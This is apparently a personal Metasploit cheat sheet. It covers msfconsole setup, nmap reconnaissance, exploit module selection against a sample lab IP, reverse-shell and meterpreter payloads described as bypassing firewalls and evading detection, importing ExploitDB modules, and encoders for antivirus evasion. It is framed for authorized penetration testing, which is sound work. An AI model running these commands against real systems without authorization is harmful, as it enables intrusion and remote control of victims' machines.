# 🛰️ Metasploit Framework Overview

## Initial Setup & Environment Configuration

### Launching Metasploit Console
```bash
msfconsole
```

### Setting Up Localhost
```bash
set LHOST 127.0.0.1
```

### Basic Reconnaissance
#### Scanning with Nmap Integration
```bash
db_nmap -n -v -sS -Pn <target>
```
#### Gathering Host Information
```bash
hosts
services
creds
```

## Exploitation Workflow

### Searching for Modules
```bash
search weblogic
```

### Selecting and Configuring an Exploit Module
```bash
use exploit/multi/http/cisco_wccp_dos
show options
set RHOSTS 10.10.254.39
set URIPATH /test
set SSL true
exploit
sessions -l
```

### Session Interaction
```bash
sessions -i <session_id>
shell
background
```

## Payloads

### Selecting a Payload
```bash
set payload windows/x64/meterpreter/reverse_tcp
show payloads
grep meterpreter show payloads
```

#### Commonly Used Payloads
| Payload | Description |
|---------|-------------|
| `windows/x64/shell_reverse_tcp` | Simple reverse shell for quick access. |
| `windows/x64/meterpreter/reverse_https` | Meterpreter payload over HTTPS for stealth and bypassing firewalls. |
| `windows/x64/meterpreter/reverse_tcp` | Basic meterpreter session, provides advanced post-exploitation capabilities. |

### Memory-resident Payload Example
```bash
set payload windows/x64/meterpreter_reverse_https
```

## Database Integration (Enterprise Feature)

### Basic Setup
```bash
sudo msfdb init
msfconsole
db_status
workspace -a ProjectX
```

### Key Commands
```bash
db_nmap -sV target
hosts
services
creds
db_export -f xml backup.xml
```

## Essential Commands

### Module Management
```bash
help search          # Search help
info                 # Module information
options              # Show module options
set <option> <value> # Set option value
setg <option> <value># Set global option
unset <option>       # Unset option
```

### Session Management
```bash
sessions             # List active sessions
sessions -i <id>     # Interact with session
sessions -k <id>     # Kill session
background           # Background current session
```

### Payload & Target Management
```bash
show payloads        # List available payloads
set payload <name>   # Set specific payload
show targets         # Show available targets
set target <id>      # Set target (0=Automatic)
```

## Best Practices

1. **Always verify targets** before exploitation.
2. **Use auxiliary scanners** to confirm vulnerabilities.
3. **Set appropriate payloads** for target architecture.
4. **Test exploits** in lab environments first.
5. **Document attempts** and customizations needed.
6. **Use global settings** for efficiency during engagements.

## Common Workflow

1. **Reconnaissance**: Scan target ports and services.
2. **Search**: Find relevant modules using keywords.
3. **Select**: Choose appropriate exploit module.
4. **Configure**: Set required options (RHOSTS, LHOST, etc.).
5. **Target**: Set specific target or use automatic detection.
6. **Payload**: Select appropriate payload (shell, meterpreter, etc.).
7. **Verify**: Check options and module info.
8. **Execute**: Run the exploit.
9. **Post-exploit**: Use meterpreter or shell for further access.

---

# 🛠️ Module Management & Custom Modules

### Importing Modules from ExploitDB

#### Find MSF Modules
```bash
searchsploit -t <service> --exclude=".py"
searchsploit nagios3 --exclude=".py"

# Look for .rb files (Ruby/Metasploit modules)
searchsploit -t <service> | grep "\.rb"
```

#### Install Custom Module
```bash
# Copy to appropriate directory
cp ~/Downloads/exploit.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/custom_exploit.rb

# Launch with module path
msfconsole -m /usr/share/metasploit-framework/modules/

# OR reload in running session
msf6 > reload_all
msf6 > use exploit/unix/webapp/custom_exploit
```

### Directory Structure
```
/usr/share/metasploit-framework/modules/
├── exploits/
│   ├── windows/
│   ├── linux/
│   └── unix/webapp/
├── auxiliary/
├── post/
└── payloads/
```

### Naming Convention
- **snake_case**: Use underscores, not dashes.
- **Alphanumeric**: No special characters.
- **Descriptive**: Clear purpose indication.

**Examples:**
- ✅ `nagios3_command_injection.rb`
- ✅ `bludit_auth_bypass.rb`
- ❌ `nagios-exploit.rb` (dashes)
- ❌ `exploit@test.rb` (special chars)

### Module Installation Process
```bash
# 1. Download module
wget https://www.exploit-db.com/raw/9861 -O nagios3_exploit.rb

# 2. Place in correct directory
sudo cp nagios3_exploit.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

# 3. Load in msfconsole
msf6 > reload_all
msf6 > search nagios3
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

### Troubleshooting
- **Module not found**: Check file path and naming.
- **Load errors**: Verify Ruby syntax and dependencies.
- **Permission issues**: Use sudo for system directories.

**Note**: For advanced module development, see [Metasploit Documentation](https://docs.metasploit.com/)

---

# 📚 Payloads

### Overview
Payloads are the executable code sent to a target during an exploit. They can be designed to deliver shells or meterpreter sessions, each with different capabilities and stealth levels.

#### Example: `windows/x64/meterpreter/reverse_tcp`
```bash
set payload windows/x64/meterpreter_reverse_https
```

### Payload Management

#### List Available Payloads
```bash
# Show all payloads
msf6 > show payloads

# Search for specific payloads
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter show payloads
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter grep reverse_tcp show payloads
```

#### Select Payload
```bash
# Set payload by number
msf6 exploit(windows/smb/ms17_010_psexec) > set payload 15

# Set payload by name
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/meterpreter/reverse_tcp
```

### Common Payload Examples

#### Windows Payloads
| Payload | Description |
|---------|-------------|
| `windows/x64/shell_reverse_tcp` | Simple reverse shell for quick access. |
| `windows/x64/meterpreter/reverse_https` | Meterpreter payload over HTTPS for stealth and bypassing firewalls. |
| `windows/x64/meterpreter/reverse_tcp` | Basic meterpreter session, provides advanced post-exploitation capabilities. |

#### Connection Types
| Type | Description | Use Case |
|------|-------------|----------|
| **reverse_tcp** | Target connects back to attacker | Bypasses firewalls |
| **bind_tcp** | Attacker connects to target | Direct connection |
| **reverse_https** | HTTPS tunnel for stealth | Evades detection |

### Payload Configuration
```bash
# Required payload options
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port
```

---

# 🛠️ Encoders (Legacy AV Evasion)

### Overview
Encoders modify payloads to:
- Make compatible with different architectures (x86, x64).
- Remove bad characters from shellcode.
- Historically: evade antivirus detection.

### Current Status
- **Shikata Ga Nai** was once highly effective.
- **Modern AV** systems detect most encoded payloads.
- **Limited effectiveness** for evasion (51/68 detection rate).

### Basic Commands
```bash
show encoders                    # List compatible encoders
set encoder x86/shikata_ga_nai  # Set encoder
```

### Modern Approach
See `payloads.md` for current AV evasion techniques

---

# 🔖 Summary & Tips

## Essential Commands
```bash
help search          # Search help
info                 # Module information
options              # Show module options
set <option> <value> # Set option value
setg <option> <value># Set global option
unset <option>       # Unset option
sessions             # List active sessions
reload_all           # Reload all modules
```

## Best Practices

1. **Always verify targets** before exploitation.
2. **Use auxiliary scanners** to confirm vulnerabilities.
3. **Set appropriate payloads** for target architecture.
4. **Test exploits** in lab environments first.
5. **Document attempts** and customizations needed.
6. **Use global settings** for efficiency during engagements.

## Common Workflow

1. **Reconnaissance**: Scan target ports and services.
2. **Search**: Find relevant modules using keywords.
3. **Select**: Choose appropriate exploit module.
4. **Configure**: Set required options (RHOSTS, LHOST, etc.).
5. **Target**: Set specific target or use automatic detection.
6. **Payload**: Select appropriate payload (shell, meterpreter, etc.).
7. **Verify**: Check options and module info.
8. **Execute**: Run the exploit.
9. **Post-exploit**: Use meterpreter or shell for further access.

---

# 🛠️ Troubleshooting

### Common Issues
- **Module not found**: Ensure the module path is correct.
- **Load errors**: Verify Ruby syntax and dependencies.
- **Permission issues**: Use sudo for system directories.

---

# 📚 References & Documentation
For advanced module development, see [Metasploit Documentation](https://docs.metasploit.com/). For more detailed information on specific modules, use the `info` command in Metasploit. 

---


# 🔐 Security and Legal Considerations

### Security Practices
- Always conduct penetration testing with explicit permission.
- Ensure compliance with relevant laws and regulations.

---

This guide provides a comprehensive overview of using Metasploit for penetration testing and exploitation tasks. Follow these guidelines to enhance your skills and maintain ethical standards in security operations. 🛡️